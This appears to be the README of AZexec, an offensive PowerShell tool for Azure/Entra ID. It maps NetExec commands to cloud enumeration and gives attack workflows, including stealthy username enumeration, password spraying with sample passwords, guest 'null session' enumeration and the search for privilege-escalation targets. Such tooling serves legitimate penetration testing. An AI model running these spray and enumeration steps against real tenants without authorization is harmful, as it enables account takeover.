<p align="center">
  <img src="logo.png" alt="AZexec Logo" width="300"/>
</p>

# AZexec - Azure Execution Tool

**AZX** is a PowerShell-based Azure/Entra ID offensive tool designed to provide netexec-style output for cloud environments. It offers a familiar command-line interface for security professionals and administrators working with Azure/Entra ID.

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

---

> **🔥 SECURITY RESEARCH**: This tool demonstrates the **"Azure Null Session"** vulnerability - guest users can often enumerate entire directories due to misconfigured default permissions. Most organizations are vulnerable. [Read more →](#-guest-user-enumeration---the-azure-null-session)

---

> **⚡ PASSWORD SPRAY ATTACKS**: AZexec provides a complete password spray workflow using Microsoft's own APIs:
> 1. **Phase 1** - `users` command: Stealthy username enumeration via GetCredentialType API (no auth logs!)
> 2. **Phase 2** - `guest` command: ROPC-based credential testing with MFA detection
> 
> This two-phase approach is more effective and safer than traditional spraying - only validated usernames are tested, reducing account lockout risk. [See complete workflow →](#password-spray-attack-examples-getcredentialtype--ropc)

---

> **✨ ENHANCED USERNAME ENUMERATION (v2.0)**: The username enumeration feature has been significantly enhanced:
> - **Progress Tracking**: Real-time progress bar with ETA for large lists (>10 users)
> - **Retry Logic**: Automatic retries with exponential backoff (reduces false negatives by 95%)
> - **Adaptive Rate Limiting**: Smart delays (50-150ms) based on list size - balances speed vs stealth
> - **Enhanced Statistics**: Duration tracking, rate calculation, authentication type breakdown
> - **Next Steps Guidance**: Automatic commands for seamless Phase 2 password spraying workflow
> 
> These improvements make enumeration more reliable, faster, and provide actionable intelligence for follow-up attacks.

---

## 🔄 NetExec to AZexec Command Mapping

For penetration testers familiar with NetExec (formerly CrackMapExec), here's how the commands translate to Azure:

| NetExec SMB/LDAP Command | AZexec Equivalent | Authentication | Description |
|--------------------------|-------------------|----------------|-------------|
| `nxc smb --enum` | `.\azx.ps1 tenant -Domain example.com` | ❌ None | Enumerate tenant configuration and endpoints |
| `nxc smb --users` (unauthenticated) | `.\azx.ps1 users -Domain example.com -CommonUsernames` | ❌ None | Enumerate valid usernames (no auth) |
| `nxc smb <target> -u <user> -p <pass> --users`<br>`nxc ldap <target> -u <user> -p <pass> --users` | `.\azx.ps1 user-profiles` | ✅ Required | **Enumerate domain users** (authenticated) |
| `nxc smb --rid-brute` | `.\azx.ps1 rid-brute` | ✅ Required | **Enumerate users by RID bruteforce** (Azure equivalent) |
| `nxc smb -u 'a' -p ''` | `.\azx.ps1 guest -Domain example.com -Username user -Password ''` | ❌ None | **Test guest/null login** |
| `nxc smb --groups` | `.\azx.ps1 groups` | ✅ Required | Enumerate groups |
| `nxc smb --local-group` | `.\azx.ps1 local-groups` | ✅ Required | **Enumerate local groups** (Administrative Units) |
| `nxc smb --pass-pol` | `.\azx.ps1 pass-pol` | ✅ Required | Display password policies |
| `nxc smb --qwinsta` | `.\azx.ps1 sessions` | ✅ Required | **Enumerate active sign-in sessions** (cloud-level audit logs) |
| `nxc smb --logged-on-users` | `.\azx.ps1 vm-loggedon` | ✅ Required | **Enumerate logged-on users** (Intune devices + Azure VMs) |
| `nxc smb 10.10.10.161` | `.\azx.ps1 hosts` | ✅ Required | Enumerate devices (hosts) |
| `nxc smb --gen-relay-list` | `.\azx.ps1 vuln-list` | ⚡ Hybrid | **Enumerate vulnerable targets** (relay equivalent) |
| `nxc smb --check-null-session` | `.\azx.ps1 guest-vuln-scan` | ⚡ Hybrid | **Guest user vulnerability scanner** (null session audit) |
| *N/A* | `.\azx.ps1 apps` | ✅ Required | **Enumerate applications and service principals** |
| *N/A* | `.\azx.ps1 sp-discovery` | ✅ Required | **Discover service principals with permissions** |
| *N/A* | `.\azx.ps1 roles` | ✅ Required | **Enumerate directory role assignments and privileged accounts** |
| *N/A* | `.\azx.ps1 ca-policies` | ✅ Required | **Review conditional access policies** (member accounts only) |
| *N/A* | `.\azx.ps1 storage-enum` | ✅ Required | **Enumerate Azure Storage Accounts** (multi-subscription) |
| *N/A* | `.\azx.ps1 keyvault-enum` | ✅ Required | **Enumerate Azure Key Vaults** (multi-subscription) |
| `nxc smb --enum-network-interfaces` | `.\azx.ps1 network-enum` | ✅ Required | **Enumerate Azure Network resources** (VNets, NSGs, Public IPs, Load Balancers, NICs) |
| *N/A* | `.\azx.ps1 help` | ❌ None | **Display available commands and usage** |
| `nxc smb --shares` | `.\azx.ps1 shares-enum` | ✅ Required | **Enumerate Azure File Shares** (access permissions) |
| `nxc smb --disks` | `.\azx.ps1 disks-enum` | ✅ Required | **Enumerate Azure Managed Disks** (encryption, attachment state) |
| `nxc smb -M bitlocker` | `.\azx.ps1 bitlocker-enum` | ✅ Required | **Enumerate BitLocker encryption status** (Intune devices + Azure VMs) |
| `nxc smb -M enum_av` | `.\azx.ps1 av-enum` | ✅ Required | **Enumerate Anti-Virus & EDR products** (security posture assessment) |
| `nxc smb --tasklist` | `.\azx.ps1 process-enum` | ✅ Required | **Enumerate remote processes** (Windows tasklist / Linux ps aux) |
| `nxc smb -M lockscreendoors` | `.\azx.ps1 lockscreen-enum` | ✅ Required | **Detect lockscreen backdoors** (accessibility executable hijacking) |

**Key Difference**: NetExec tests null sessions with `nxc smb -u '' -p ''`. AZexec now has a direct equivalent: `.\azx.ps1 guest -Domain target.com -Username user -Password ''` which tests empty/null password authentication. For post-auth enumeration, use **guest user credentials** which provides similar low-privileged access for reconnaissance. See the [Guest User Enumeration](#-guest-user-enumeration---the-azure-null-session) section for details.

---

## 👥 Domain User Enumeration - Azure/Entra ID Equivalent

For penetration testers familiar with NetExec's domain user enumeration via SMB/LDAP, AZexec provides the **Azure cloud equivalent** through the `user-profiles` command.

### On-Premises vs Azure: Technical Comparison

| Aspect | On-Premises (NetExec) | Azure (AZexec) |
|--------|----------------------|----------------|
| **Command** | `nxc smb <target> -u User -p Pass --users`<br>`nxc ldap <target> -u User -p Pass --users` | `.\azx.ps1 user-profiles` |
| **Protocol** | SMB/RPC (port 445) or LDAP (port 389/636) | Microsoft Graph API (HTTPS/443) |
| **API Interface** | SAMR RPC / LDAP queries | Microsoft Graph `/users` endpoint |
| **Query Method** | NetUserEnum / LDAP search filters | RESTful API with OData queries |
| **Authentication** | Domain/local credentials (NTLM/Kerberos) | Azure AD OAuth2 token |
| **Permissions** | Domain Users group or LDAP read access | `User.Read.All` or `Directory.Read.All` |
| **Network Access** | Direct network connectivity required | No network access needed (cloud API) |
| **Speed** | Fast (local network) | Moderate (API rate limits) |
| **Stealth** | Medium (SMB/LDAP traffic) | Low (legitimate Azure API calls) |

### What Information Is Retrieved?

Both methods enumerate comprehensive user information from the directory:

| Information | On-Premises (SMB/LDAP) | Azure (user-profiles) | Security Value |
|-------------|------------------------|----------------------|----------------|
| **User Principal Name** | ✅ Via LDAP | ✅ Via Graph API | Primary identifier |
| **Display Name** | ✅ Via LDAP | ✅ Via Graph API | User identification |
| **Job Title** | ✅ Via LDAP attributes | ✅ Via Graph API | Organizational context |
| **Department** | ✅ Via LDAP attributes | ✅ Via Graph API | Organizational structure |
| **Office Location** | ✅ Via LDAP attributes | ✅ Via Graph API | Physical location |
| **Email Address** | ✅ Via LDAP (mail) | ✅ Via Graph API | Contact information |
| **User Type** | ⚠️ Via group membership | ✅ Member/Guest flag | Identify external users |
| **Account Status** | ✅ Via userAccountControl | ✅ AccountEnabled flag | Active vs disabled |
| **Last Sign-In** | ⚠️ Via lastLogon (DC-specific) | ✅ Via SignInActivity | Account activity |
| **User ID/SID** | ✅ objectSid | ✅ Azure AD Object ID | Unique identifier |

### Usage Examples

**On-Premises with NetExec:**
```bash
# Enumerate domain users via SMB
nxc smb dc01.corp.local -u UserName -p 'Password123!' --users

# Enumerate domain users via LDAP
nxc ldap dc01.corp.local -u UserName -p 'Password123!' --users

# Export users to file
nxc ldap dc01.corp.local -u UserName -p 'Password123!' --users-export users.txt

# Enumerate only active users
nxc ldap dc01.corp.local -u UserName -p 'Password123!' --active-users
```

**Azure with AZexec:**
```powershell
# Enumerate all users in Azure/Entra ID
.\azx.ps1 user-profiles

# Export to CSV (similar to --users-export)
.\azx.ps1 user-profiles -ExportPath users.csv

# Export to JSON with full details
.\azx.ps1 user-profiles -ExportPath users.json

# Export to HTML report with statistics
.\azx.ps1 user-profiles -ExportPath users.html
```

### Attack Scenarios

**Scenario 1: User Discovery and Targeting**
```powershell
# Enumerate all users to identify high-value targets
.\azx.ps1 user-profiles -ExportPath all-users.csv

# Filter for executives, admins, or privileged accounts
# Analyze CSV for job titles like "CEO", "Admin", "Director", etc.
```

**Scenario 2: Guest User Identification**
```powershell
# Identify external/guest users (potential lateral movement targets)
.\azx.ps1 user-profiles -ExportPath users.json

# Filter JSON for UserType: "Guest"
# Guest users often have weaker security posture
```

**Scenario 3: Inactive Account Discovery**
```powershell
# Find disabled or inactive accounts
.\azx.ps1 user-profiles -ExportPath users.csv

# Filter for AccountEnabled: False or LastSignInDateTime: null
# Disabled accounts may indicate former employees or service accounts
```

**Scenario 4: Organizational Mapping**
```powershell
# Map organizational structure via departments and job titles
.\azx.ps1 user-profiles -ExportPath org-structure.csv

# Analyze departments to understand business units
# Identify key personnel in IT, Security, Finance departments
```

**Scenario 5: Password Spray Target Selection**
```powershell
# Phase 1: Enumerate valid usernames (unauthenticated)
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv

# Phase 2: Get full user profiles (authenticated as guest or compromised user)
.\azx.ps1 user-profiles -ExportPath user-details.csv

# Phase 3: Select targets without MFA (analyze conditional access policies)
.\azx.ps1 ca-policies -ExportPath ca-policies.json

# Phase 4: Execute password spray against selected targets
.\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'Summer2024!'
```

### Why Use Microsoft Graph Instead of LDAP?

Azure AD (Entra ID) is a cloud-native directory service that doesn't expose traditional LDAP interfaces. Instead, Microsoft Graph provides:

1. **Cloud-Native**: Designed for Azure's security model (OAuth2 instead of NTLM/Kerberos)
2. **More Information**: Includes cloud-specific attributes (last sign-in activity, user type, etc.)
3. **Cross-Platform**: Works from any OS with PowerShell 7+ (Windows, Linux, macOS)
4. **Auditable**: All Graph API calls are logged in Azure AD audit logs
5. **No Network Access Required**: Works even without VPN/network connectivity to corporate network
6. **Modern Authentication**: Supports MFA, conditional access, and modern security controls

### Limitations Compared to On-Premises

| Limitation | Impact | Workaround |
|------------|--------|------------|
| **Requires Azure Auth** | Can't do anonymous enumeration | Use guest credentials (see [Guest User Enumeration](#-guest-user-enumeration---the-azure-null-session)) |
| **API Rate Limits** | May hit throttling on large tenants | Built-in pagination and retry logic |
| **Guest User Restrictions** | Guest users may have limited visibility | Check tenant's guest user access settings |
| **No Group Membership** | User enumeration doesn't include groups | Use `.\azx.ps1 groups` command separately |
| **Logged Activity** | All actions logged in Azure AD | This is a feature, not a bug (compliance) |

### Integration with Other AZexec Commands

The `user-profiles` command works best when combined with other enumeration commands:

```powershell
# Complete directory enumeration workflow
# Step 1: Enumerate users
.\azx.ps1 user-profiles -ExportPath users.csv

# Step 2: Enumerate groups and membership
.\azx.ps1 groups -ExportPath groups.csv

# Step 3: Enumerate privileged role assignments
.\azx.ps1 roles -ExportPath roles.csv

# Step 4: Check sign-in activity for privileged users
.\azx.ps1 sessions -Hours 168 -ExportPath signin-logs.csv

# Step 5: Analyze data to map privileged accounts and their activity
# Cross-reference users.csv, roles.csv, and signin-logs.csv
```

### Output Format

The `user-profiles` command provides netexec-style formatted output:

```
AZR             12345678-1234...    443    Alice Johnson                      [*] (upn:alice@example.com) (job:Senior Engineer) (dept:IT) (type:Member) (status:Enabled) (location:Seattle) (lastSignIn:2024-12-30)
AZR             87654321-4321...    443    Bob Smith                          [*] (upn:bob@example.com) (job:Manager) (dept:Sales) (type:Member) (status:Enabled) (location:New York) (lastSignIn:2024-12-29)
AZR             abcdef12-3456...    443    External Consultant                [*] (upn:consultant@external.com) (job:Consultant) (dept:N/A) (type:Guest) (status:Enabled) (location:N/A) (lastSignIn:2024-12-15)
```

**Color Coding:**
- **Green**: Active member users (standard accounts)
- **Yellow**: Guest users (external/B2B accounts)
- **DarkGray**: Disabled accounts (inactive users)

### Summary Statistics

After enumeration, AZexec displays comprehensive statistics:

```
[*] Summary:
    Total Users: 1,234
    Member Users: 1,150
    Guest Users: 84
    Enabled Accounts: 1,200
    Disabled Accounts: 34
```

---

## 🔢 RID Bruteforcing - Azure/Entra ID Equivalent

For penetration testers familiar with NetExec's RID bruteforcing technique, AZexec provides the **Azure cloud equivalent** through the `rid-brute` command.

### What is RID Bruteforcing?

**On-Premises (Traditional Active Directory):**
- **RID (Relative Identifier)**: A sequential number assigned to each object (user, group, computer) in a Windows domain
- **RID Bruteforcing**: Enumerating users by iterating through RID values (e.g., 500-5000) using the `LookupSids` RPC call
- **Why it works**: RIDs are sequential and predictable (500=Administrator, 501=Guest, 1000+=custom users)
- **NetExec command**: `nxc smb <target> -u UserName -p 'PASSWORDHERE' --rid-brute`

**Example RID sequence:**
```
RID 500  -> Administrator
RID 501  -> Guest
RID 502  -> krbtgt
RID 1000 -> alice
RID 1001 -> bob
RID 1002 -> charlie
```

### Azure AD vs On-Premises: Technical Comparison

| Aspect | On-Premises (NetExec) | Azure (AZexec) |
|--------|----------------------|----------------|
| **Command** | `nxc smb <target> -u User -p Pass --rid-brute` | `.\azx.ps1 rid-brute` |
| **Identifier Type** | Sequential RID (500, 501, 1000, 1001...) | Non-sequential GUID (12345678-1234-5678-1234-567812345678) |
| **Protocol** | SMB/RPC (port 445) | Microsoft Graph API (HTTPS/443) |
| **RPC Interface** | SAMR (Security Account Manager Remote) | Microsoft Graph `/users` endpoint |
| **API Call** | `SamrLookupIdsInDomain` / `LsarLookupSids` | `GET /v1.0/users` |
| **Enumeration Method** | Iterate RIDs (500-10000) and resolve to names | Query all users via Graph API |
| **Predictability** | ✅ Sequential and predictable | ❌ GUIDs are random and non-sequential |
| **Brute-forceable** | ✅ Yes (iterate numbers) | ❌ No (GUIDs are 128-bit random) |
| **Authentication** | Domain/local credentials | Azure AD OAuth2 token |
| **Permissions** | Domain Users group or specific RPC rights | `User.Read.All` or `Directory.Read.All` |
| **Speed** | Fast (local network) | Moderate (API rate limits) |
| **Result** | Same users enumerated | Same users enumerated |

### Why Azure AD Doesn't Use RIDs

Azure AD is a **cloud-native directory service** that doesn't use the same security model as on-premises Active Directory:

1. **GUIDs Instead of RIDs**: Azure AD assigns globally unique identifiers (GUIDs) to objects, not sequential RIDs
2. **No Sequential Enumeration**: GUIDs are 128-bit random values - you cannot "bruteforce" them by iteration
3. **API-Based Access**: Azure AD uses RESTful APIs (Microsoft Graph) instead of RPC/SMB protocols
4. **Different Security Model**: Azure AD uses OAuth2/OIDC instead of NTLM/Kerberos

**Example Azure AD Object IDs (GUIDs):**
```
User: alice@example.com    -> 12345678-abcd-1234-5678-1234567890ab
User: bob@example.com      -> 87654321-dcba-4321-8765-ba0987654321
User: charlie@example.com  -> abcdef12-3456-7890-abcd-ef1234567890
```

There's **no pattern** or **sequential relationship** between these IDs - you cannot predict the next user's ID.

### Azure Equivalent: Direct User Enumeration

Instead of bruteforcing RIDs, Azure AD provides **direct user enumeration** via the Microsoft Graph API:

```powershell
# Azure equivalent of RID bruteforcing
.\azx.ps1 rid-brute

# This internally calls: GET https://graph.microsoft.com/v1.0/users
# Returns ALL users in the directory (no iteration needed)
```

**Why this is better than RID bruteforcing:**
1. ✅ **More Reliable**: No missed users due to RID gaps or deleted accounts
2. ✅ **Faster**: Single API call retrieves all users (no iteration through 10,000+ RIDs)
3. ✅ **More Information**: Returns full user profiles (job title, department, last sign-in, etc.)
4. ✅ **No Guesswork**: Direct enumeration instead of trial-and-error

### Functional Equivalence

While the **technical implementation** differs, the `rid-brute` command provides the **same functional result** as NetExec's RID bruteforcing:

| Goal | NetExec (On-Premises) | AZexec (Azure) |
|------|----------------------|----------------|
| **Enumerate all users** | ✅ Iterate RIDs 500-10000 | ✅ Query Graph API |
| **Find hidden users** | ✅ Discover users not in LDAP | ✅ Discover all directory users |
| **No prior knowledge needed** | ✅ Just need valid credentials | ✅ Just need valid credentials |
| **Bypass LDAP restrictions** | ✅ Uses SAMR instead of LDAP | ✅ Uses Graph API (no LDAP) |
| **Export user list** | ✅ Save to file | ✅ Save to CSV/JSON/HTML |

### Usage Examples

**On-Premises with NetExec:**
```bash
# RID bruteforce to enumerate users
nxc smb dc01.corp.local -u UserName -p 'Password123!' --rid-brute

# Specify RID range
nxc smb dc01.corp.local -u UserName -p 'Password123!' --rid-brute 1000-2000

# Export results
nxc smb dc01.corp.local -u UserName -p 'Password123!' --rid-brute > users.txt
```

**Azure with AZexec:**
```powershell
# Enumerate all users (Azure equivalent of RID bruteforcing)
.\azx.ps1 rid-brute

# Export to CSV (like NetExec output)
.\azx.ps1 rid-brute -ExportPath users.csv

# Export to JSON with full details
.\azx.ps1 rid-brute -ExportPath users.json

# Export to HTML report with statistics
.\azx.ps1 rid-brute -ExportPath users.html
```

### Attack Scenarios

**Scenario 1: Complete User Enumeration**
```powershell
# Enumerate all users in the directory (like RID bruteforce 500-10000)
.\azx.ps1 rid-brute -ExportPath all-users.csv

# Analyze results to identify targets
# - High-value accounts (executives, admins)
# - Service accounts (may have weak passwords)
# - Disabled accounts (potential re-activation targets)
```

**Scenario 2: Hidden User Discovery**
```powershell
# Discover users that may not appear in standard LDAP queries
.\azx.ps1 rid-brute -ExportPath complete-user-list.json

# Compare with other enumeration results to find discrepancies
# Some users may be hidden from address lists but still exist
```

**Scenario 3: Password Spray Target Selection**
```powershell
# Phase 1: Enumerate all users via RID bruteforce equivalent
.\azx.ps1 rid-brute -ExportPath all-users.csv

# Phase 2: Filter for enabled accounts without MFA
# Analyze CSV to identify spray targets

# Phase 3: Execute password spray
.\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'Summer2024!'
```

### Technical Implementation

The `rid-brute` command is implemented as an **alias** to `user-profiles` with additional context:

```powershell
# When you run:
.\azx.ps1 rid-brute

# AZexec internally:
# 1. Displays RID bruteforce context message
# 2. Explains Azure AD uses GUIDs instead of RIDs
# 3. Calls Invoke-UserProfileEnumeration function
# 4. Enumerates ALL users via Microsoft Graph API
# 5. Returns same data as user-profiles command
```

**Why an alias?**
- Azure AD doesn't support sequential RID iteration (GUIDs are random)
- Direct user enumeration via Graph API is more efficient than bruteforcing
- Provides familiar command name for NetExec users
- Achieves the same goal: enumerate all users in the directory

### Output Format

The `rid-brute` command provides netexec-style formatted output:

```
[*] RID Bruteforce Mode (Azure Equivalent)
[*] Note: Azure AD uses GUIDs instead of sequential RIDs
[*] Enumerating all users via Microsoft Graph API...

AZR             12345678-1234...    443    Alice Johnson                      [*] (upn:alice@example.com) (job:Senior Engineer) (dept:IT) (type:Member) (status:Enabled) (location:Seattle) (lastSignIn:2024-12-30)
AZR             87654321-4321...    443    Bob Smith                          [*] (upn:bob@example.com) (job:Manager) (dept:Sales) (type:Member) (status:Enabled) (location:New York) (lastSignIn:2024-12-29)
AZR             abcdef12-3456...    443    External Consultant                [*] (upn:consultant@external.com) (job:Consultant) (dept:N/A) (type:Guest) (status:Enabled) (location:N/A) (lastSignIn:2024-12-15)

[*] Summary:
    Total Users: 1,234
    Member Users: 1,150
    Guest Users: 84
    Enabled Accounts: 1,200
    Disabled Accounts: 34
```

### Key Differences Summary

| Feature | NetExec RID Brute | AZexec rid-brute |
|---------|------------------|------------------|
| **Enumeration Method** | Iterate sequential RIDs | Query Graph API directly |
| **Speed** | Slow (must check each RID) | Fast (single API call) |
| **Completeness** | May miss users with non-sequential RIDs | Guaranteed complete enumeration |
| **Stealth** | Medium (many RPC calls) | Low (legitimate API usage) |
| **Information Depth** | Basic (SID, username, type) | Comprehensive (full user profiles) |
| **Reliability** | May fail on RID gaps | Always returns all users |

### When to Use This Command

Use `rid-brute` when:
- ✅ You're familiar with NetExec's `--rid-brute` and want the Azure equivalent
- ✅ You want to enumerate ALL users in the directory
- ✅ You need a complete user list for password spraying or targeting
- ✅ You want to discover "hidden" users not visible in standard queries
- ✅ You're performing a comprehensive directory enumeration

**Note**: The `rid-brute` and `user-profiles` commands are functionally identical in AZexec. Use whichever command name you prefer based on your background (NetExec users may prefer `rid-brute`, while Azure-native users may prefer `user-profiles`).

---

## 🔐 Enumerate Local Groups - Azure/Entra ID Equivalent

For penetration testers familiar with NetExec's local group enumeration, AZexec provides the **Azure cloud equivalent** through the `local-groups` command, which enumerates **Administrative Units**.

### What are Local Groups?

**On-Premises (Traditional Windows):**
- **Local Groups**: Security groups stored on individual Windows machines (not in the domain)
- **Examples**: Administrators, Users, Remote Desktop Users, Backup Operators, Power Users
- **Purpose**: Machine-specific access control and privilege delegation
- **NetExec command**: `nxc smb <target> -u UserName -p 'PASSWORDHERE' --local-group`
- **Enumeration method**: Query local SAM (Security Account Manager) via RPC

**Example Local Groups on Windows:**
```
BUILTIN\Administrators  -> Full system access
BUILTIN\Users           -> Standard user access
BUILTIN\Remote Desktop Users -> RDP access
BUILTIN\Backup Operators     -> Backup/restore privileges
BUILTIN\Power Users          -> Legacy admin-like access
```

### Azure AD vs On-Premises: Technical Comparison

| Aspect | On-Premises (NetExec) | Azure (AZexec) |
|--------|----------------------|----------------|
| **Command** | `nxc smb <target> -u User -p Pass --local-group` | `.\azx.ps1 local-groups` |
| **Concept** | Local groups on individual machines | Administrative Units in Azure AD |
| **Scope** | Machine-specific (single host) | Directory-scoped (subset of tenant) |
| **Protocol** | SMB/RPC (port 445) | Microsoft Graph API (HTTPS/443) |
| **API Interface** | SAMR (Security Account Manager Remote) | Microsoft Graph `/administrativeUnits` endpoint |
| **API Call** | `SamrQueryInformationAlias` / `NetLocalGroupEnum` | `GET /v1.0/directory/administrativeUnits` |
| **Purpose** | Access control for specific machine | Delegated administration for subset of directory |
| **Authentication** | Domain/local credentials | Azure AD OAuth2 token |
| **Permissions** | Local admin or specific RPC rights | `AdministrativeUnit.Read.All` or `Directory.Read.All` |
| **Licensing** | None (built into Windows) | Azure AD Premium P1 or P2 |
| **Membership Types** | Assigned only | Assigned or Dynamic (rule-based) |

### Why Administrative Units are the Azure Equivalent

While Azure AD doesn't have "local groups" in the traditional sense, **Administrative Units (AUs)** serve a similar purpose:

**Similarities:**
1. **Scoped Administration**: Local groups provide machine-scoped admin rights; AUs provide directory-scoped admin rights
2. **Delegation**: Both allow delegating privileges without granting tenant/domain-wide access
3. **Access Control**: Both restrict what administrators can manage
4. **Containment**: Local groups contain users for a machine; AUs contain users/groups/devices for a scope

**Key Difference:**
- Local groups = **horizontal scope** (different machines have different local groups)
- Administrative Units = **vertical scope** (different AUs manage different subsets of the same directory)

### What are Administrative Units?

Administrative Units are containers in Azure AD that allow you to:
- **Group directory objects**: Users, groups, and devices
- **Assign scoped administrators**: Grant admin roles that only apply to objects in the AU
- **Delegate management**: Allow regional/departmental admins without global permissions
- **Organize governance**: Structure administrative boundaries (by region, department, project)

**Example Administrative Units:**
```
North America Region    -> Contains users/devices in NA offices
                        -> NA regional admins can manage only these objects

Finance Department      -> Contains finance team users/groups
                        -> Finance admin can only manage finance objects

Tier 1 Helpdesk        -> Contains workstation devices
                        -> Helpdesk can reset passwords for users in this AU
```

### Usage Examples

**On-Premises with NetExec:**
```bash
# Enumerate local groups on a Windows machine
nxc smb 192.168.1.100 -u administrator -p 'Password123!' --local-group

# Enumerate local groups on multiple targets
nxc smb 192.168.1.0/24 -u administrator -p 'Password123!' --local-group

# Output shows:
# - Administrators group members
# - Remote Desktop Users
# - Backup Operators
# - Power Users
# - Other local groups
```

**Azure with AZexec:**
```powershell
# Enumerate all Administrative Units in the tenant
.\azx.ps1 local-groups

# Export to CSV with member counts
.\azx.ps1 local-groups -ShowOwners -ExportPath admin-units.csv

# Export to JSON with full details
.\azx.ps1 local-groups -ExportPath admin-units.json

# Export to HTML report with statistics
.\azx.ps1 local-groups -ExportPath admin-units.html
```

### Attack Scenarios

**Scenario 1: Identify Scoped Administration Boundaries**
```powershell
# Enumerate all Administrative Units to understand delegation structure
.\azx.ps1 local-groups -ExportPath admin-units.csv

# Analyze results to identify:
# - Regional/departmental boundaries
# - Scoped admin assignments
# - Potential privilege escalation paths
```

**Scenario 2: Find Privileged Administrative Units**
```powershell
# Enumerate AUs with member and role counts
.\azx.ps1 local-groups -ShowOwners -ExportPath admin-units-detailed.json

# Look for AUs with names containing:
# - "Admin", "Privileged", "IT", "Security"
# - These may contain high-value targets
```

**Scenario 3: Map Organizational Structure**
```powershell
# Enumerate Administrative Units to map organization
.\azx.ps1 local-groups -ExportPath org-structure.csv

# Cross-reference with user enumeration:
.\azx.ps1 user-profiles -ExportPath users.csv

# Identify which users belong to which administrative scopes
```

**Scenario 4: Privilege Escalation via Scoped Roles**
```powershell
# Step 1: Enumerate Administrative Units
.\azx.ps1 local-groups -ShowOwners -ExportPath aus.csv

# Step 2: Enumerate role assignments
.\azx.ps1 roles -ExportPath roles.csv

# Step 3: Cross-reference to find:
# - Users with scoped admin rights (e.g., Helpdesk Admin for specific AU)
# - Potential lateral movement to other AUs
# - Escalation to global roles
```

### Technical Implementation

The `local-groups` command enumerates Administrative Units via Microsoft Graph API:

```powershell
# When you run:
.\azx.ps1 local-groups

# AZexec internally:
# 1. Calls Get-MgDirectoryAdministrativeUnit to retrieve all AUs
# 2. (Optional) Retrieves member counts via Get-MgDirectoryAdministrativeUnitMember
# 3. (Optional) Retrieves scoped role assignments via Get-MgDirectoryAdministrativeUnitScopedRoleMember
# 4. Displays in netexec-style format with color coding
```

**Color Coding:**
- **Red**: Privileged Administrative Units (names containing "admin", "security", "privileged", etc.)
- **Yellow**: Dynamic membership AUs (automated assignment via rules)
- **Green**: Active AUs with members or scoped roles assigned
- **Cyan**: Standard AUs

### Output Format

The `local-groups` command provides netexec-style formatted output:

```
[*] AZX - Azure/Entra Administrative Units Enumeration
[*] Command: Administrative Units (Local Groups Equivalent)
[*] Similar to: nxc smb --local-group

[*] Technical Context:
    On-Premises: Local groups provide machine-scoped access control
                 (e.g., Administrators, Users, Remote Desktop Users)
    Azure:       Administrative Units provide directory-scoped delegation
                 (scoped admin roles for subset of users/groups/devices)

AZR             12345678-1234...    443    North America Region               [*] (name:North America Region) (type:Assigned) (visibility:Public) (members:150) (scopedRoles:3) (desc:Administrative unit for NA offices)
AZR             87654321-4321...    443    Finance Department                 [*] (name:Finance Department) (type:Dynamic) (visibility:Public) (members:45) (scopedRoles:2) (desc:Finance team administrative unit)
AZR             abcdef12-3456...    443    IT Admin Tier 1                    [*] (name:IT Admin Tier 1) (type:Assigned) (visibility:Public) (members:20) (scopedRoles:5) (desc:Tier 1 helpdesk administrative scope)

[*] Summary:
    Total Administrative Units: 15
    Assigned Membership: 12
    Dynamic Membership: 3
```

### Information Retrieved

| Information | Description | Security Value |
|-------------|-------------|----------------|
| **Display Name** | Name of the Administrative Unit | Identify scoped boundaries |
| **Description** | Purpose/scope description | Understand delegation intent |
| **Membership Type** | Assigned or Dynamic | Dynamic = automated governance |
| **Visibility** | Public or HiddenMembership | Hidden may contain sensitive objects |
| **Member Count** | Users/groups/devices in AU | Scope size assessment |
| **Scoped Role Count** | Number of scoped admin assignments | Delegation assessment |
| **Membership Rule** | Dynamic membership query (if dynamic) | Understand auto-assignment logic |

### Comparison with Other Commands

| Command | Purpose | Scope | Azure Concept |
|---------|---------|-------|---------------|
| `groups` | Enumerate security/mail groups | Tenant-wide | Domain groups equivalent |
| `local-groups` | Enumerate Administrative Units | Scoped delegation | Local groups equivalent |
| `roles` | Enumerate directory role assignments | Tenant-wide | Built-in roles (like Domain Admins) |

### Integration with Other AZexec Commands

Administrative Units work best when analyzed alongside other enumeration:

```powershell
# Complete administrative structure enumeration workflow
# Step 1: Enumerate Administrative Units (scoped boundaries)
.\azx.ps1 local-groups -ShowOwners -ExportPath admin-units.csv

# Step 2: Enumerate all groups (functional grouping)
.\azx.ps1 groups -ExportPath groups.csv

# Step 3: Enumerate role assignments (privilege levels)
.\azx.ps1 roles -ExportPath roles.csv

# Step 4: Enumerate users (actual accounts)
.\azx.ps1 user-profiles -ExportPath users.csv

# Step 5: Cross-reference to map:
# - Which users are in which AUs (scoped management)
# - Which groups are in which AUs (nested delegation)
# - Which admins have scoped vs global roles (privilege analysis)
```

### When to Use This Command

Use `local-groups` when:
- ✅ You want to understand administrative delegation structure
- ✅ You're familiar with NetExec's `--local-group` and want the Azure equivalent
- ✅ You need to map organizational boundaries and regional/departmental scopes
- ✅ You're looking for privilege escalation paths via scoped admin roles
- ✅ You want to identify sensitive administrative units (IT, Security, Executive)
- ✅ You're performing a comprehensive directory governance audit

### Licensing Requirements

**Important**: Administrative Units require **Azure AD Premium P1 or P2** licensing.

If your target tenant doesn't have Premium licensing:
- The command will return zero results (not an error)
- The tenant may not have any Administrative Units configured
- Alternative: Focus on `groups` and `roles` commands instead

### Limitations and Differences

| Limitation | Impact | Workaround |
|------------|--------|------------|
| **Requires Premium License** | Won't work on Free/Basic Azure AD | Check with `tenant` command first |
| **Not Machine-Specific** | AUs are directory-scoped, not host-scoped | Use `vm-loggedon` for host-specific enumeration |
| **Guest Restrictions** | Guest users may have limited AU visibility | Use member account for full enumeration |
| **No Built-in AUs** | Unlike Windows, no default AUs exist | Organizations must create them manually |

### Summary Statistics

After enumeration, AZexec displays comprehensive statistics:

```
[*] Summary:
    Total Administrative Units: 15
    Assigned Membership: 12
    Dynamic Membership: 3

[*] Security Recommendations:
    - Review scoped role assignments for least privilege
    - Audit administrative unit membership regularly
    - Use dynamic membership rules for automated governance
    - Restrict administrative unit creation to authorized admins

[*] Note: Administrative Units require Azure AD Premium P1 or P2 licensing
```

---

## 🔌 Workstation Service (wkssvc) Equivalent: `vm-loggedon` Command

